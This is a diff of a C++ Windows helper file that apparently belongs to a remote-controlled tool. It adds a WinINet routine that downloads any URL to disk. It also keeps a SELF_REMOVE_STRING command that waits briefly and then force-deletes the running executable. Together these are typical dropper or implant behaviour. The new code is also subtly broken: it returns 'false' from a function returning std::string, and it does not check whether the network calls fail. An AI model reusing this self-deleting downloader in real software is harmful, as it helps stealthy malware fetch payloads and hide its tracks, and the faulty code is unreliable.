@@ -2,6 +2,9 @@
 #include <iostream>
 #include <fstream>
 #include <LM.h>
+#include <wininet.h>
+#pragma comment(lib,"wininet")
+
 #include <strsafe.h>
 #define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 127.0.0.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
 
@@ -294,16 +297,42 @@ class Helpers
 		}
 
 		static std::string downloadFile(std::string url, std::string file) {
-			HRESULT hr = URLDownloadToFile(NULL, _T(url.c_str()), _T(file.c_str()), 0, NULL);
-			/*
-			const char* strUrl = url.c_str();
-			const char* strFile = file.c_str(); // I had been testing with these, not currently using them
-			HRESULT hr = URLDownloadToFile(NULL, url.c_str(), file.c_str(), 0, NULL);
-			*/
-			if (FAILED(hr)) {
-				return "failed";
+			std::cout << url;
+			HINTERNET hInternetSession;
+			HINTERNET hURL;
+			// I'm only going to access 1K of info.
+			BOOL bResult;
+			DWORD dwBytesRead = 1;
+			//Make internet connection.
+			hInternetSession = InternetOpen(
+				"Windows", // agent
+				INTERNET_OPEN_TYPE_PRECONFIG,  // access
+				NULL, NULL, 0);                // defaults
+
+			// Make connection to desired page.
+			hURL = InternetOpenUrl(
+				hInternetSession,                       // session handle
+				url.c_str(),   // URL to access
+				NULL, 0, 0, 0);                         // defaults
+
+			// Read file into memory buffer.
+			char buf[1024];
+			DWORD dwTemp;
+			HANDLE hFile = CreateFile(file.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (INVALID_HANDLE_VALUE == hFile) {
+				return false;
 			}
-			return "ok";
+			for (; dwBytesRead > 0;)
+			{
+				InternetReadFile(hURL, buf, (DWORD)sizeof(buf), &dwBytesRead);
+				WriteFile(hFile, buf, dwBytesRead, &dwTemp, NULL);
+			}
+
+			// Close down connections.
+			InternetCloseHandle(hURL);
+			InternetCloseHandle(hInternetSession);
+			CloseHandle(hFile);
+			return "true";
 		}
 
 
